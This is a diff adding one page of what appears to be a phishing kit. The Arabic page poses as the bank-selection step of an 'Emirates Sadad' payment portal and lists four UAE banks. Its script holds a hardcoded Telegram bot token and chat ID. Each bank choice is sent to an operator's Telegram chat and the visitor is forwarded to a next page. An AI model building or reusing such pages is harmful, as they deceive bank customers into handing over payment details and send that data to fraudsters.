@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختيار البنك - بوابة سداد الإمارات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://petra.gov.jo/upload/1542630954928.jpg" type="image/x-icon">
+    <style>
+        :root {
+            --primary-color: #008000;
+            --secondary-color: #FFD700;
+            --text-color: #333;
+            --light-gray: #f5f5f5;
+            --border-color: #ddd;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #f9f9f9;
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; min-height: 100vh; }
+
+        .header {
+            text-align: center; margin-bottom: 30px; padding: 20px;
+            background-color: white; border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header img { height: 80px; margin-bottom: 10px; }
+        .header h1 { color: var(--primary-color); font-size: 24px; margin-bottom: 10px; }
+
+        .form-container {
+            background-color: white; border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; margin-bottom: 20px;
+        }
+
+        .bank-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .bank-card {
+            background-color: white;
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .bank-card:hover {
+            border-color: var(--primary-color);
+            transform: translateY(-3px);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .bank-card img {
+            height: 50px;
+            width: auto;
+            max-width: 100%;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+
+        .bank-card p { font-size: 14px; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://petra.gov.jo/upload/1542630954928.jpg" alt="شعار سداد الإمارات">
+            <h1>اختر البنك الخاص بك</h1>
+        </div>
+        
+        <div class="form-container">
+            <p style="text-align: center; margin-bottom: 20px;">يرجى اختيار البنك الذي تملك فيه حساباً لإتمام عملية الدفع:</p>
+            
+            <div class="bank-cards">
+                <div class="bank-card" onclick="selectBank('emiratesNBD', 'بنك الإمارات دبي الوطني')">
+                    <img src="https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg" alt="Emirates NBD">
+                    <p>بنك الإمارات دبي الوطني</p>
+                </div>
+                
+                <div class="bank-card" onclick="selectBank('firstAbuDhabi', 'بنك أبو ظبي الأول')">
+                    <img src="https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png" alt="FAB">
+                    <p>بنك أبو ظبي الأول</p>
+                </div>
+
+                <div class="bank-card" onclick="selectBank('abuDhabiCommercial', 'بنك أبو ظبي التجاري')">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10" alt="ADCB">
+                    <p>بنك أبو ظبي التجاري</p>
+                </div>
+
+                <div class="bank-card" onclick="selectBank('dubaiIslamic', 'بنك دبي الإسلامي')">
+                    <img src="https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg" alt="DIB">
+                    <p>بنك دبي الإسلامي</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
+        const telegramChatId = '8362204213';
+
+        async function appendToTelegram(newContent) {
+            const existingId = localStorage.getItem('telegramMessageId');
+            const existingContent = localStorage.getItem('telegramMessageContent') || '';
+            const updatedContent = existingContent + '\n\n' + newContent;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        message_id: parseInt(existingId),
+                        text: updatedContent,
+                        parse_mode: 'HTML'
+                    })
+                });
+                localStorage.setItem('telegramMessageContent', updatedContent);
+            } catch (e) { console.error(e); }
+        }
+
+        async function selectBank(bankKey, bankName) {
+            localStorage.setItem('selectedBank', bankKey);
+            localStorage.setItem('selectedBankName', bankName);
+
+            const content = `🏦 <b>اختيار البنك</b>\n📊 البنك المختار: ${bankName}`;
+            await appendToTelegram(content);
+
+            window.location.href = 'page4.html';
+        }
+    </script>
+</body>
+</html>
